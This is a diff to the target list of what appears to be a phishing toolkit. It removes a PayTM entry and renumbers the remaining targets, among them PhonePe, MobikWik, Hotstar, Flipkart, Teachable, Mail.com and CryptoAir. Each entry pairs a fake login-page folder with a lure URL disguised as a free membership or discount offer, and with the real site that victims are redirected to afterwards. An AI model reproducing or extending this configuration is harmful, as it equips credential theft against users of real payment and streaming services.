@@ -490,70 +490,63 @@
       "redirect": "https://web.whatsapp.com"
     },
     {
-      "name": "PayTM",
-      "choice": "69",
-      "folder": "login_paytm",
-      "mask": "https://play-premium-games-for-free",
-      "redirect": "https://paytm.com"
-    },
-    {
       "name": "PhonePay",
-      "choice": "70",
+      "choice": "69",
       "folder": "login_phonepay",
       "mask": "https://get-50%-discount-on-any-sale",
       "redirect": "https://www.phonepe.com"
     },
     {
       "name": "MobikWik",
-      "choice": "71",
+      "choice": "70",
       "folder": "login_mobikwik",
       "mask": "https://get-premium-membership-free",
       "redirect": "https://www.mobikwik.com"
     },
     {
       "name": "Hotstar",
-      "choice": "72",
+      "choice": "71",
       "folder": "login_hotstar",
       "mask": "https://get-premium-membership-free",
       "redirect": "https://www.hotstar.com/in"
     },
     {
       "name": "FlipCart",
-      "choice": "73",
+      "choice": "72",
       "folder": "login_flipcart",
       "mask": "https://get-50%-discount-on-any-sale",
       "redirect": "https://www.flipkart.com"
     },
     {
       "name": "Teachable",
-      "choice": "74",
+      "choice": "73",
       "folder": "login_teachable",
       "mask": "https://get-premium-membership-free",
       "redirect": "https://sso.teachable.com/secure/teachable_accounts/sign_in"
     },
     {
       "name": "Mail",
-      "choice": "75",
+      "choice": "74",
       "folder": "login_mail",
       "mask": "https://get-premium-membership-free",
       "redirect": "https://support.mail.com"
     },
     {
       "name": "CryptoAir",
-      "choice": "76",
+      "choice": "75",
       "folder": "login_cryptoair",
       "mask": "https://get-premium-membership-free",
       "redirect": "https://cryptoair.ltd/?a=forgot_password"
     },
     {
       "name": "Amino",
-      "choice": "77",
+      "choice": "76",
       "folder": "login_amino",
       "mask": "https://get-premium-membership-free"
     },
     {
       "name": "Custom",
-      "choice": "78",
+      "choice": "77",
       "folder": "custom",
       "mask": "custom"
     }
